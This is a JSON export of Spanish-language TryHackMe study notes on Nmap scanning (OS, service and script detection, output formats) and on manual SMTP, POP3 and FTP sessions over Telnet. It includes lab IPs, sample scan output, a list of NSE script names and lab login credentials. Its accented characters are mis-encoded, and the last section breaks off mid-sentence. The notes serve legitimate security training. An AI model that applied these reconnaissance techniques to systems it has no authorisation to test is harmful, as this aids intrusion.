    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/6. Nmap Post Port Scans/3. OS Detection and Traceroute.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 6. Nmap Post Port Scans",
    "content": "<h2>OS Detection</h2>\nNmap puede detectar el Sistema Operativo (SO) basado en su comportamiento y cualquier detalle en su respuesta. La detecci√≥n del OS se puede habilitar con la opci√≥n `-O` (\"o\" may√∫scula, no cero).\n\nEn el siguiente ejemplo, usando la opci√≥n, no s√≥lo nos muestra el sistema operativo sino tambi√©n la versi√≥n del kernel.\n\n```shell\npentester@TryHackMe$ sudo nmap -sS -O 10.80.135.73\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2021-09-10 05:04 BST\nNmap scan report for 10.80.135.73\nHost is up (0.00099s latency).\nNot shown: 994 closed ports\nPORT    STATE SERVICE\n22/tcp  open  ssh\n25/tcp  open  smtp\n80/tcp  open  http\n110/tcp open  pop3\n111/tcp open  rpcbind\n143/tcp open  imap\nMAC Address: 02:A0:E7:B5:B6:C5 (Unknown)\nDevice type: general purpose\nRunning: Linux 3.X\nOS CPE: cpe:/o:linux:linux_kernel:3.13\nOS details: Linux 3.13\nNetwork Distance: 1 hop\n\nOS detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 3.91 seconds\n```\n\nAunque es una funcionalidad muy buena, no es 100% precisa y Nmap necesita al menos un puerto abierto y uno cerrado para hacer una estimaci√≥n realista.\n\n----------------------------------------\n<h2>Traceroute</h2>\nSi quieres que Nmap encuentre los routers entre t√∫ y tu objetivo, simplemente a√±ade la opci√≥n `--traceroute`. El traceroute de Nmap funciona a la inversa que el de Linux o Windows. Mientras que el de ellos empieza con un TTL bajo e incrementa hasta llegar a su objetivo, el de Nmap empieza con un TTL muy alto y va bajando. Veamos un ejemplo de esta opci√≥n aplicada.\n\n```shell\npntester@TryHackMe$ sudo nmap -sS --traceroute 10.80.135.73\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2021-09-10 05:05 BST\nNmap scan report for 10.80.135.73\nHost is up (0.0015s latency).\nNot shown: 994 closed ports\nPORT    STATE SERVICE\n22/tcp  open  ssh\n25/tcp  open  smtp\n80/tcp  open  http\n110/tcp open  pop3\n111/tcp open  rpcbind\n143/tcp open  imap\nMAC Address: 02:A0:E7:B5:B6:C5 (Unknown)\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   1.48 ms 10.80.135.73\n\nNmap done: 1 IP address (1 host up) scanned in 1.59 seconds\n```\n\n>[!IMPORTANT] Muchos routers est√°n configurados para no mandar ICMP TTL lo que prevendr√≠a que descubri√©semos su direcci√≥n IP.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Saving the Output",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/6-nmap-post-port-scans/5-saving-the-output/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/6. Nmap Post Port Scans/5. Saving the Output.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 6. Nmap Post Port Scans",
    "content": "Cuando ejecutamos un comando de Nmap, es razonable guardar los resultados en un archivo. Para ello debemos seleccionar el tipo correcto de archivo que necesitemos en cada momento. Seleccionar una buena manera de nombrarlos tambi√©n es crucial.  Los principales formatos son:\n\n- Normal\n- Grepeable (`grep`)\n- XML\n\n-----------------------------\n<h2>Normal</h2>\nComo el nombre infiere, el formato normal es similar al output de nmap que te sale en pantalla. Puedes elegir este formato usando `-oN <nombre_archivo>`.\n\n```shell\npentester@TryHackMe$ cat MACHINE_IP_scan.nmap \n# Nmap 7.60 scan initiated Fri Sep 10 05:14:19 2021 as: nmap -sS -sV -O -oN MACHINE_IP_scan 10.82.182.44\n\nNmap scan report for 10.82.182.44\nHost is up (0.00086s latency).\nNot shown: 994 closed ports\nPORT    STATE SERVICE VERSION\n22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)\n25/tcp  open  smtp    Postfix smtpd\n80/tcp  open  http    nginx 1.6.2\n110/tcp open  pop3    Dovecot pop3d\n111/tcp open  rpcbind 2-4 (RPC #100000)\n143/tcp open  imap    Dovecot imapd\nMAC Address: 02:A0:E7:B5:B6:C5 (Unknown)\nDevice type: general purpose\nRunning: Linux 3.X\nOS CPE: cpe:/o:linux:linux_kernel:3.13\nOS details: Linux 3.13\nNetwork Distance: 1 hop\nService Info: Host:  debra2.thm.local; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Fri Sep 10 05:14:28 2021 -- 1 IP address (1 host up) scanned in 9.99 seconds\n```\n\n-----------------------------------\n<h2>Grepeable</h2>\nEl formato grepeable saca su nombre del comando `grep` (Global Regular Expression Printer), el cual permite buscar y filtrar patrones. Puedes elegirlo usando `-oG <nombre_archivo>`.\n\n```shell\npentester@TryHackMe$ cat MACHINE_IP_scan.gnmap \n# Nmap 7.60 scan initiated Fri Sep 10 05:14:19 2021 as: nmap -sS -sV -O -oG MACHINE_IP_scan 10.82.182.44\nHost: 10.82.182.44\tStatus: Up\nHost: 10.82.182.44\tPorts: 22/open/tcp//ssh//OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)/, 25/open/tcp//smtp//Postfix smtpd/, 80/open/tcp//http//nginx 1.6.2/, 110/open/tcp//pop3//Dovecot pop3d/, 111/open/tcp//rpcbind//2-4 (RPC #100000)/, 143/open/tcp//imap//Dovecot imapd/\tIgnored State: closed (994)\tOS: Linux 3.13\tSeq Index: 257\tIP ID Seq: All zeros\n# Nmap done at Fri Sep 10 05:14:28 2021 -- 1 IP address (1 host up) scanned in 9.99 seconds\n```\n\nEs √∫til y eficiente al buscar por cosas como el siguiente motivo:\n\n```shell\npentester@TryHackMe$ grep http MACHINE_IP_scan.gnmap \nHost: 10.82.182.44\tPorts: 22/open/tcp//ssh//OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)/, 25/open/tcp//smtp//Postfix smtpd/, 80/open/tcp//http//nginx 1.6.2/, 110/open/tcp//pop3//Dovecot pop3d/, 111/open/tcp//rpcbind//2-4 (RPC #100000)/, 143/open/tcp//imap//Dovecot imapd/\tIgnored State: closed (994)\tOS: Linux 3.13\tSeq Index: 257\tIP ID Seq: All zeros\n```\n\n---------------------------------\n<h2>XML</h2>\nEl tercer formato es XML. Puedes guardar los resultados del escaneo en formato XML usando `-oX <nombre_archivo>`. El formato XML es muy conveniente al cargarlo en otros programas gracias a sus etiquetas.\n\n\n>[!IMPORTANT] Tambi√©n puedes guardar el resultado en todos los formatos usando `-oA <nombre_archivo>`.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Nmap Scripting Engine (NSE)",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/6-nmap-post-port-scans/4-nmap-scripting-engine-nse/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/6. Nmap Post Port Scans/4. Nmap Scripting Engine (NSE).md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 6. Nmap Post Port Scans",
    "content": "Un script es una pieza de c√≥digo que no necesita ser compilada. Es deicir que permanece en un estado legible para un humano. Muchos programas ofrecen funcionalidades extra v√≠a scripts. Adem√°s los scripts hacen posible a√±adir funcionalidades personalizadas que no exist√≠an en los comandos. Nmap ofrece soporte de scripts usando el lengueje Lua. El motor de scripting de Nmap (NSE) es un interpretador de Lua que permite a Nmap hacer uso de scripts.\n\nLa instalaci√≥n por defecto de Nmap puede contener hasta 600 scripts. Estos est√°n en la ruta `/usr/share/nmap/scripts`. Estos scripts est√°n convenientemente nombrados empezando por el protocolo al que se dirigen. Podemos encontrar alrededor de 120 scripts que empiezan con HTTP:\n\n```shell\npentester@AttackBox /usr/share/nmap/scripts# ls http*\n\nhttp-adobe-coldfusion-apsa1301.nse      http-passwd.nse\nhttp-affiliate-id.nse                   http-php-version.nse\nhttp-apache-negotiation.nse             http-phpmyadmin-dir-traversal.nse\nhttp-apache-server-status.nse           http-phpself-xss.nse\nhttp-aspnet-debug.nse                   http-proxy-brute.nse\nhttp-auth-finder.nse                    http-put.nse\nhttp-auth.nse                           http-qnap-nas-info.nse\nhttp-avaya-ipoffice-users.nse           http-referer-checker.nse\nhttp-awstatstotals-exec.nse             http-rfi-spider.nse\nhttp-axis2-dir-traversal.nse            http-robots.txt.nse\nhttp-backup-finder.nse                  http-robtex-reverse-ip.nse\nhttp-barracuda-dir-traversal.nse        http-robtex-shared-ns.nse\nhttp-brute.nse                          http-security-headers.nse\nhttp-cakephp-version.nse                http-server-header.nse\nhttp-chrono.nse                         http-shellshock.nse\nhttp-cisco-anyconnect.nse               http-sitemap-generator.nse\nhttp-coldfusion-subzero.nse             http-slowloris-check.nse\nhttp-comments-displayer.nse             http-slowloris.nse\nhttp-config-backup.nse                  http-sql-injection.nse\nhttp-cookie-flags.nse                   http-stored-xss.nse\nhttp-cors.nse                           http-svn-enum.nse\nhttp-cross-domain-policy.nse            http-svn-info.nse\nhttp-csrf.nse                           http-title.nse\nhttp-date.nse                           http-tplink-dir-traversal.nse\nhttp-default-accounts.nse               http-trace.nse\nhttp-devframework.nse                   http-traceroute.nse\nhttp-dlink-backdoor.nse                 http-unsafe-output-escaping.nse\nhttp-dombased-xss.nse                   http-useragent-tester.nse\nhttp-domino-enum-passwords.nse          http-userdir-enum.nse\nhttp-drupal-enum-users.nse              http-vhosts.nse\nhttp-drupal-enum.nse                    http-virustotal.nse\nhttp-enum.nse                           http-vlcstreamer-ls.nse\nhttp-errors.nse                         http-vmware-path-vuln.nse\nhttp-exif-spider.nse                    http-vuln-cve2006-3392.nse\nhttp-favicon.nse                        http-vuln-cve2009-3960.nse\nhttp-feed.nse                           http-vuln-cve2010-0738.nse\nhttp-fetch.nse                          http-vuln-cve2010-2861.nse\nhttp-fileupload-exploiter.nse           http-vuln-cve2011-3192.nse\nhttp-form-brute.nse                     http-vuln-cve2011-3368.nse\nhttp-form-fuzzer.nse                    http-vuln-cve2012-1823.nse\nhttp-frontpage-login.nse                http-vuln-cve2013-0156.nse\nhttp-generator.nse                      http-vuln-cve2013-6786.nse\nhttp-git.nse                            http-vuln-cve2013-7091.nse\nhttp-gitweb-projects-enum.nse           http-vuln-cve2014-2126.nse\nhttp-google-malware.nse                 http-vuln-cve2014-2127.nse\nhttp-grep.nse                           http-vuln-cve2014-2128.nse\nhttp-headers.nse                        http-vuln-cve2014-2129.nse\nhttp-huawei-hg5xx-vuln.nse              http-vuln-cve2014-3704.nse\nhttp-icloud-findmyiphone.nse            http-vuln-cve2014-8877.nse\nhttp-icloud-sendmsg.nse                 http-vuln-cve2015-1427.nse\nhttp-iis-short-name-brute.nse           http-vuln-cve2015-1635.nse\nhttp-iis-webdav-vuln.nse                http-vuln-cve2017-1001000.nse\nhttp-internal-ip-disclosure.nse         http-vuln-cve2017-5638.nse\nhttp-joomla-brute.nse                   http-vuln-cve2017-5689.nse\nhttp-litespeed-sourcecode-download.nse  http-vuln-cve2017-8917.nse\nhttp-ls.nse                             http-vuln-misfortune-cookie.nse\nhttp-majordomo2-dir-traversal.nse       http-vuln-wnr1000-creds.nse\nhttp-malware-host.nse                   http-waf-detect.nse\nhttp-mcmp.nse                           http-waf-fingerprint.nse\nhttp-method-tamper.nse                  http-webdav-scan.nse\nhttp-methods.nse                        http-wordpress-brute.nse\nhttp-mobileversion-checker.nse          http-wordpress-enum.nse\nhttp-ntlm-info.nse                      http-wordpress-users.nse\nhttp-open-proxy.nse                     http-xssed.nse\nhttp-open-redirect.nse\n```\n\nPuedes especificar usar cualquiera (o un grupo) de estos scripts. Adem√°s puedes instalar m√°s scripts e incluso hacer los tuyos propios. Para elegir scripts de la categor√≠a default (por defecto) puedes usar `--script=default` o a√±adir `-sC`. Las categor√≠as son:\n\n| Categor√≠a de Script | Descripci√≥n                                                          |\n| ------------------- | -------------------------------------------------------------------- |\n| `auth`              | Scripts relacionados con la autenticaci√≥n                            |\n| `broadcast`         | Descubre hosts mandando mensajes de broadcast                        |\n| `brute`             | Realiza auditor√≠a de contrase√±as de fuerza bruta contra logins       |\n| `default`           | Scripts por defecto (lo mismo que `-sC`)                             |\n| `discovery`         | Recupera informaci√≥n accesible como bases de datos y nombres DNS     |\n| `dos`               | Detecta servidores vulnerables a Denegaci√≥n de Servicio (DoS)        |\n| `exploit`           | Intenta explotar servicios vulnerables                               |\n| `external`          | Comprueba usando un servicio de terceros como Geoplugin o Virustotal |\n| `fuzzer`            | Lanza ataques de fuzzeo                                              |\n| `intrusive`         | Scripts intrusivos como fuerza bruta y explotaci√≥n                   |\n| `malware`           | Escanea en busca de backdoors                                        |\n| `safe`              | Scripts seguros que no crashear√°n al objetivo                        |\n| `version`           | Devuelve versiones de servicio                                       |\n| `vuln`              | Comprueba vulnerabilidades o explota servicios vulnerables           |\n\nSi queremos lanzar un escaneo SYN contra una IP y ejecutar los scripts por defecto el comando es`sudo nmap -sS -sC >IP_OBJETIVO>`.\n\n```shell\npentester@TryHackMe$ sudo nmap -sS -sC 10.80.135.73\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2021-09-10 05:08 BST\nNmap scan report for ip-10-10-161-170.eu-west-1.compute.internal (10.10.161.170)\nHost is up (0.0011s latency).\nNot shown: 994 closed ports\nPORT    STATE SERVICE\n22/tcp  open  ssh\n| ssh-hostkey: \n|   1024 d5:80:97:a3:a8:3b:57:78:2f:0a:78:ae:ad:34:24:f4 (DSA)\n|   2048 aa:66:7a:45:eb:d1:8c:00:e3:12:31:d8:76:8e:ed:3a (RSA)\n|   256 3d:82:72:a3:07:49:2e:cb:d9:87:db:08:c6:90:56:65 (ECDSA)\n|_  256 dc:f0:0c:89:70:87:65:ba:52:b1:e9:59:f7:5d:d2:6a (EdDSA)\n25/tcp  open  smtp\n|_smtp-commands: debra2.thm.local, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, \n| ssl-cert: Subject: commonName=debra2.thm.local\n| Not valid before: 2021-08-10T12:10:58\n|_Not valid after:  2031-08-08T12:10:58\n|_ssl-date: TLS randomness does not represent time\n80/tcp  open  http\n|_http-title: Welcome to nginx on Debian!\n110/tcp open  pop3\n|_pop3-capabilities: RESP-CODES CAPA TOP SASL UIDL PIPELINING AUTH-RESP-CODE\n111/tcp open  rpcbind\n| rpcinfo: \n|   program version   port/proto  service\n|   100000  2,3,4        111/tcp  rpcbind\n|   100000  2,3,4        111/udp  rpcbind\n|   100024  1          38099/tcp  status\n|_  100024  1          54067/udp  status\n143/tcp open  imap\n|_imap-capabilities: LITERAL+ capabilities IMAP4rev1 OK Pre-login ENABLE have LOGINDISABLEDA0001 listed SASL-IR ID more post-login LOGIN-REFERRALS IDLE\nMAC Address: 02:A0:E7:B5:B6:C5 (Unknown)\n\nNmap done: 1 IP address (1 host up) scanned in 2.21 seconds\n```\n\nTambi√©n puedes especificar el script por su nombre usando `--script \"NOMBRE-SCRIPT\"` o por patrones `--script \"ftp*\"`, lo que incluir√°, por ejemplo, `ftp-brute`.\n\nConsideremos un script benigno, como `http-date` que devolver√° la fecha y hora del servidor.\n\n```shell\npentester@TryHackMe$ sudo nmap -sS -n --script \"http-date\" 10.80.135.73\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2021-09-10 08:04 BST\nNmap scan report for 10.80.135.73\nHost is up (0.0011s latency).\nNot shown: 994 closed ports\nPORT    STATE SERVICE\n22/tcp  open  ssh\n25/tcp  open  smtp\n80/tcp  open  http\n|_http-date: Fri, 10 Sep 2021 07:04:26 GMT; 0s from local time.\n110/tcp open  pop3\n111/tcp open  rpcbind\n143/tcp open  imap\nMAC Address: 02:44:87:82:AC:83 (Unknown)\n\nNmap done: 1 IP address (1 host up) scanned in 1.78 seconds\n```",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Nmap Post Port Scans",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/6-nmap-post-port-scans/0-nmap-post-port-scans/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/6. Nmap Post Port Scans/0. Nmap Post Port Scans.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 6. Nmap Post Port Scans",
    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/6. Nmap Post Port Scans/1. Introduction]]\n[[2. Service Detection]]\n[[3. OS Detection and Traceroute]]\n[[4. Nmap Scripting Engine (NSE)]]\n[[5. Saving the Output]]\n[[6. Summary]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Service Detection",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/6-nmap-post-port-scans/2-service-detection/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/6. Nmap Post Port Scans/2. Service Detection.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 6. Nmap Post Port Scans",
    "content": "Una vez que Nmap descubre puertos abiertos, puedes escanear los siguientes puertos para detectar servicios en ejecuci√≥n.\n\nA√±adir la opci√≥n `-sV` a tu comando recolectar√° y determinar√° el servicio y la versi√≥n del servicio corriendo en los puertos. Puedes controlar la intensidad con `--version-intensity LEVEL` donde `LECEL` es un n√∫mero entre 0 y 9. Por ejemplo, `--version-light` es lo mismo que `--version-intensity 2` y `--version-all` el lo mismo que `--version-intensity 9`.\n\nEs importante recalcar que usar la opci√≥n `-sV` forzar√° a Nmap a usar un 3-way handshake para establecer conexi√≥n. Es necesario porque Nmap no puede descubrir la versi√≥n sin establecer la conexi√≥n.\n\nEl ejemplo de abajo es un output de la consola al usar la opci√≥n `-sV`.\n\n```shell\npentester@TryHackMe$ sudo nmap -sV 10.80.135.73\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2021-09-10 05:03 BST\nNmap scan report for 10.80.135.73\nHost is up (0.0040s latency).\nNot shown: 995 closed ports\nPORT    STATE SERVICE VERSION\n22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)\n25/tcp  open  smtp    Postfix smtpd\n80/tcp  open  http    nginx 1.6.2\n110/tcp open  pop3    Dovecot pop3d\n111/tcp open  rpcbind 2-4 (RPC #100000)\nMAC Address: 02:A0:E7:B5:B6:C5 (Unknown)\nService Info: Host:  debra2.thm.local; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 8.40 seconds\n```",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Simple Mail Transfer Protocol (SMTP)",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/7-protocols-and-servers/5-simple-mail-transfer-protocol-smtp/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/7. Protocols and Servers/5. Simple Mail Transfer Protocol (SMTP).md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 7. Protocols and Servers",
    "content": "El email es uno de los servicios m√°s usados en internet. Hay varias configuraciones para servidores de email. Por ejemplo, puedes configurar un servidor para permitir a usuarios locales intercambiar emails con cada uno sin acceso a internet. Sin embargo, consideraremos configuraciones m√°s generales.\n\nEl env√≠o de emails a trav√©s de internet requiere lo siguiente:\n\n1. Mail Submission Agent (MSA)\n2. Mail Transfer Agent (MTA)\n3. Mail Delivery Agent (MDA)\n4. Mail User Agent (MUA)\n\nSon los agentes de subida, transferencia, reparto y usuario.\n\n![[Pasted image 20251121121401.png]]\n\nLos pasos son:\n\n1. Un MUA sube un correo al MSA.\n2. El MTA lo manda mediante el MDA al MTA del recibidor.\n3. El MSA del recibidor lo manda al MUA del recibido.\n\nUn MSA puede funcionar tambi√©n como MTA.\n\nPara comunicarnos con todos los agentes necesitamos el conjunto de dos protocolos.\n\n- SMTP (Simple Mail Transfer Protocol).\n- POP3 (Post Office) o IMAP (Internet Message Access Protocol).\n\nExplicaremos POP3 e IMAP m√°s adelante, en esta tarea nos centraremos en SMTP.\n\nSMTP se utiliza para comunicarse con el servidor MTA. Como SMTP manda las comunicaciones sin cifrar, podemos usar Telnet para conectarnos a un servidor SMTP simulando ser un MUA.\n\nSMTP escucha en el puerto 25 por defecto. Una vez conectados usamos `helo hostname` para empezar a escribir nuestro mail.\n\n```shell\npentester@TryHackMe$ telnet 10.80.185.10 25\nTrying 10.80.185.10...\nConnected to 10.80.185.10.\nEscape character is '^]'.\n220 bento.localdomain ESMTP Postfix (Ubuntu)\nhelo telnet\n250 bento.localdomain\nmail from: \n250 2.1.0 Ok\nrcpt to: \n250 2.1.5 Ok\ndata\n354 End data with .\nsubject: Sending email with Telnet\nHello Frank,\nI am just writing to say hi!             \n.\n250 2.0.0 Ok: queued as C3E7F45F06\nquit\n221 2.0.0 Bye\nConnection closed by foreign host.\n```\n\nDespu√©s de `helo`, mandamos `mail from:` y `rcpt to:` para indicar el emisor y el receptor. Cuando mandamos el email usamos el comando `data` y escribimos el mensaje. Usamos  `<CR><LF>.<CR><LF>` o `Enter . Enter`. Entonces el servidor SMTP pone el mensaje en cola.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "8. Summary",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/7-protocols-and-servers/8-summary/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/7. Protocols and Servers/8. Summary.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 7. Protocols and Servers",
    "content": "En esta unidad hemos cubierto varios protocolos, su uso y c√≥mo funcionan por detr√°s. En la pr√≥xima unidad aprenderemos sobre ataques contra estos servicios junto con mitigaciones.\n\n| Protocolo | Puerto TCP | Aplicaci√≥n(es) | Seguridad |\n| --------- | ---------- | -------------- | --------- |\n| FTP       | 21         | File Transfer  | Cleartext |\n| HTTP      | 80         | Worldwide Web  | Cleartext |\n| IMAP      | 143        | Email (MDA)    | Cleartext |\n| POP3      | 110        | Email (MDA)    | Cleartext |\n| SMTP      | 25         | Email (MTA)    | Cleartext |\n| Telnet    | 23         | Remote Access  | Cleartext |",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/7-protocols-and-servers/1-introduction/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/7. Protocols and Servers/1. Introduction.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 7. Protocols and Servers",
    "content": "Esta unidad te introducir√° a unos pocos protocolos com√∫nmente usados, como:\n\n- HTTP\n- FTP\n- POP3\n- SMTP\n- IMAP\n\nCada tarea hablar√° de un protocolo y est√° dise√±ada para que entendamos lo que ocurre a bajo nivel y no se ve en la GUI. Hablaremos con los protocolos usando Telnet, para entender de forma detallada lo que pasa por detr√°s.\n\nEl prop√≥sito no es memorizar comandos sino m√°s bien entender el entramado de comunicaci√≥n presente en los protocolos.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Post Office Protocol 3 (POP3)",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/7-protocols-and-servers/6-post-office-protocol-3-pop3/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/7. Protocols and Servers/6. Post Office Protocol 3 (POP3).md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 7. Protocols and Servers",
    "content": "Post Office Protocol version 3 (POP3) es un protocolo usado para descargar mensajes de un servidor MDA como se muestra en la imagen de abajo.\n\n![[Pasted image 20251121123701.png]]\n\nEl ejemplo de abajo muestra c√≥mo se ve una sesi√≥n de POP3 si fuera conducida v√≠a Telnet. Primero, el usuario se conecta al servidor POP3 en el puerto 110 (por defecto). Se requiere autentificaci√≥n para acceder a los mensajes. El usuario debe dar el usuario  (`USER username`) y la contrase√±a (`PASS password`).Al usar el comando `STAT` obtenemos la respuesta `+OK 1 179`. Basado en [RFC 1939](https://datatracker.ietf.org/doc/html/rfc1939), una respuesta positiva de `STAT` tiene el formato `+OK nn mm`, donde `nn` es el n√∫mero de mensajes en la bandeja de entrada y `mm` es el tama√±o de la bandeja de entrada en octetos (bytes). El comando `LIST` ofrece una lista de mensajes nuevos en el servidor y `RETR 1` devuelve el primer mensaje en la lista.\n\n```shell\npentester@TryHackMe$ telnet 10.80.185.10 110\nTrying 10.80.185.10...\nConnected to 10.80.185.10.\nEscape character is '^]'.\n+OK 10.80.185.10 Mail Server POP3 Wed, 15 Sep 2021 11:05:34 +0300 \nUSER frank\n+OK frank\nPASS D2xc9CgD\n+OK 1 messages (179) octets\nSTAT\n+OK 1 179\nLIST\n+OK 1 messages (179) octets\n1 179\n.\nRETR 1\n+OK\nFrom: Mail Server \nTo: Frank \nsubject: Sending email with Telnet\nHello Frank,\nI am just writing to say hi!\n.\nQUIT\n+OK 10.80.185.10 closing connection\nConnection closed by foreign host.\n```\n\nSeg√∫n configuraci√≥n por defecto, el cliente borra el mensaje despu√©s de descargarlo, aunque esto se puede cambiar. Entrar con varios clientes a la misma cuenta no est√° recomendado, ya que este podr√≠a perder la habilidad de controlar mensajes le√≠dos/no le√≠dos. Es por esto que para tener todas las bandejas de entrada sincronizadas necesitamos usar otros protocolos como IMAP.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. File Transfer Protocol (FTP)",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/7-protocols-and-servers/4-file-transfer-protocol-ftp/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/7. Protocols and Servers/4. File Transfer Protocol (FTP).md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 7. Protocols and Servers",
    "content": "File Transfer Protocol (FTP) fue desarrollado para hacer eficiente la transferencia de archivos entre ordenadores con diferentes sistemas.\n\nFTP tambi√©n manda y recibe la informaci√≥n en texto plano, por lo que tambi√©n podemos usar Telnet (o Netcat) para comunicarnos con el servidor FTP y actuar como cliente FTP.\n\n1. Nos conectamos al servidor FTP usando Telnet. El servidor de FTP escucha en el puerto 21.\n2. Damos el nombre de usuario con `USER frank`\n3. Damos la contrase√±a con `PASS D2xc9CgD`.\n4. Como introdujimos datos correctos nos logueamos.\n\nEl comando `STAT` puede darnos informaci√≥n extra. El comando `SYST` nos muestra el tipo de sistema del objetivo. El comando `PASV` cambia el modo a pasivo. Es imprescindible saber que hay dos modos para FTP:\n\n- **Active:** La informaci√≥n se manda a trav√©s de un canal separado que se origina desde el puerto 20 del **servidor**.\n- **Passive:** La informaci√≥n se manda por un canal separado que se origina desde el puerto por encima del 1023 del **cliente**.\n\nEl comando `TYPE A` cambia el modo de transferencia de archivos a ASCII mientras que `TYPE I` lo cambia a binario. Sin embargo, no podemos transferir archivos usando clientes simples como Telnet porque FTP crea un canal nuevo para ello.\n\n```shell\npentester@TryHackMe$ telnet 10.80.185.10 21\nTrying 10.80.185.10...\nConnected to 10.80.185.10.\nEscape character is '^]'.\n220 (vsFTPd 3.0.3)\nUSER frank\n331 Please specify the password.\nPASS D2xc9CgD\n230 Login successful.\nSYST\n215 UNIX Type: L8\nPASV\n227 Entering Passive Mode (10,10,0,148,78,223).\nTYPE A\n200 Switching to ASCII mode.\nSTAT          \n211-FTP server status:\n     Connected to ::ffff:10.10.0.1\n     Logged in as frank\n     TYPE: ASCII\n     No session bandwidth limit\n     Session timeout in seconds is 300\n     Control connection is plain text\n     Data connections will be plain text\n     At session startup, client count was 1\n     vsFTPd 3.0.3 - secure, fast, stable\n211 End of status\nQUIT\n221 Goodbye.\nConnection closed by foreign host.\n```\n\nLa imagen de abajo muestra c√≥mo una transferencia de archivos real tomar√≠a lugar usando FTP. \n\n![[Pasted image 20251121114714.png]]\n\nDebido a la complejidad de FTP para recibir archivos, vamos a usar un cliente FTP para hacer una transferencia real. Aqu√≠ podemos ver que los comandos cambian respecto a Telnet, pero el principio detr√°s de ellos es el mismo.\n\n```shell\npentester@TryHackMe$ ftp 10.80.185.10\nConnected to 10.80.185.10.\n220 (vsFTPd 3.0.3)\nName: frank\n331 Please specify the password.\nPassword: D2xc9CgD\n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> ls\n227 Entering Passive Mode (10,20,30,148,201,180).\n150 Here comes the directory listing.\n-rw-rw-r--    1 1001     1001         4006 Sep 15 10:27 README.txt\n226 Directory send OK.\nftp> ascii\n200 Switching to ASCII mode.\nftp> get README.txt\nlocal: README.txt remote: README.txt\n227 Entering Passive Mode (10,10,0,148,125,55).\n150 Opening BINARY mode data connection for README.txt (4006 bytes).\nWARNING! 9 bare linefeeds received in ASCII mode\nFile may 